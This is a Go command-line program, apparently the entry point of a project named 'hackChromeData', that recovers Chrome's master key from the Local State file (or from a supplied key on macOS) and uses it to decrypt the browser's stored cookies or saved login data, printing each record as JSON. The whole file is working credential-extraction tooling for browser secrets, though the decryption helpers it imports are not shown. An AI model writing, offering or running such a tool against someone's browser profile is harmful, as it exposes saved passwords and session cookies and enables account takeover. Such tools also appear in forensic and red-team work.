package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"hackChromeData/browsingdata"
	"hackChromeData/masterkey"
	"log"
	"os"
	"runtime"
)

func main() {
	// Parse cli options
	targetpath := flag.String("targetpath", "", "File path of the kind (Cookies or Login Data)")
	kind := flag.String("kind", "", "cookie or logindata")
	localState := flag.String("localstate", "", "File path of Local State file (Windows only)")
	sessionstorage := flag.String("sessionstorage", "", "Base64 encoded Master Key (Use when you have Chrome's master key)")

	flag.Parse()
	if *targetpath == "" || *kind == "" {
		flag.Usage()
		os.Exit(1)
	}
	if runtime.GOOS == "windows" && *localState == "" {
		flag.Usage()
		os.Exit(1)
	}

	// Get Chrome's master key
	var decryptedKey string
	if *sessionstorage == "" {
		// Default path to get master key
		k, err := masterkey.GetMasterKey(*localState)
		if err != nil {
			log.Fatalf("Failed to get master key: %v", err)
		}
		decryptedKey = base64.StdEncoding.EncodeToString(k)
	} else if runtime.GOOS == "darwin" {
		// User input seed key in keychain
		b, err := masterkey.KeyGeneration([]byte(*sessionstorage))
		if err != nil {
			log.Fatalf("Failed to get master key: %v", err)
		}
		decryptedKey = base64.StdEncoding.EncodeToString(b)
	}
	fmt.Println("Master Key: " + decryptedKey)

	// Get Decrypted Data
	log.SetOutput(os.Stderr)
	switch *kind {
	case "cookie":
		c, err := browsingdata.GetCookie(decryptedKey, *targetpath)
		if err != nil {
			log.Fatalf("Failed to get logain data: %v", err)
		}
		for _, v := range c {
			j, _ := json.Marshal(v)
			fmt.Println(string(j))
		}

	case "logindata":
		ld, err := browsingdata.GetLoginData(decryptedKey, *targetpath)
		if err != nil {
			log.Fatalf("Failed to get logain data: %v", err)
		}
		for _, v := range ld {
			j, _ := json.Marshal(v)
			fmt.Println(string(j))
		}

	default:
		fmt.Println("Failed to get kind")
		os.Exit(1)
	}
}
